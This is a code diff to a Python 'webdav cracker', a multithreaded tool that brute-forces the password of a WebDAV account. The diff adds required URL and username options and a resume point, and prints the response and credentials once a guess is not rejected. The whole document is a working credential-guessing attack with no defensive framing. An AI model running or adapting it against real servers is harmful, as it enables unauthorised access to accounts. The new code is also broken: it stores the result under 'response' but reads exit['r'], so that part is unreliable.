@@ -21,18 +21,22 @@ import requests
 
 
 parser = argparse.ArgumentParser(
-    description="A tool to get access to a WEBDAV server"
+    "webdav cracker",
+    description="A tool to get access to a WEBDAV server",
+    epilog="Copyright (C) 2022 X Gamer Guide"
 )
 
 
 parser.add_argument(
-    "url",
+    "--url",
+    required=True,
     type=str,
     help="The DAV URL of the target"
 )
 
 parser.add_argument(
-    "username",
+    "--username",
+    required=True,
     type=str,
     help="Username to attack",
     default="admin"
@@ -63,10 +67,16 @@ parser.add_argument(
     ).decode()
 )
 
+parser.add_argument(
+    "--start",
+    type=str,
+    help="The last letters that were seen in the terminal when it was last run. At this point the program continues",
+    default="a"
+)
+
 
 # get command line args
 args = parser.parse_args()
-
 
 # decode letters
 letters = base64.b64decode(args.b64_letters).decode()
@@ -89,21 +99,26 @@ dav.headers = {
 
 class WEBDAV:
     def __init__(self):
-        self.stop = False
+        self.started = False
+        self.exit = None
 
     def run(self):
-        i = 0
+        i = len(args.start)
         while True:
-            for j in [""] if i == 0 else map("".join, itertools.product(letters, repeat=i)):
+            i += 1
+            for j in map("".join, itertools.product(letters, repeat=i - 1)):
                 while True:
-                    if self.stop:
-                        return
+                    if self.exit is not None:
+                        return self.exit
+                    if not self.started:
+                        if args.start != j:
+                            break
+                        self.started = True
                     if threading.active_count() < args.threads + 1:
                         print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {j} ..")
                         threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
                         break
                     time.sleep(0.1)
-            i += 1
 
     def brute_force(self, start):
         for i in range(2):
@@ -122,17 +137,22 @@ class WEBDAV:
                 )
                 # evaluate the response of the server
                 if r.status_code != 401:
-                    print("-" * 80)
-                    print(r.text)
-                    print("-" * 80)
-                    print(r.status_code)
-                    print("-" * 80)
-                    print(r.headers)
-                    print("-" * 80)
-                    print(f"USER: {args.username}")
-                    print(f"PASSWORD: {start}{j}")
-                    self.stop = True
+                    self.exit = {
+                        "response": r,
+                        "password": f"{start}{j}"
+                    }
 
 
 webdav = WEBDAV()
-webdav.run()
+exit = webdav.run()
+
+
+print("-" * 80)
+print(exit['r'].text)
+print("-" * 80)
+print(exit['r'].status_code)
+print("-" * 80)
+print(exit['r'].headers)
+print("-" * 80)
+print(f"USER: {args.username}")
+print(f"PASSWORD: {exit['password']}")
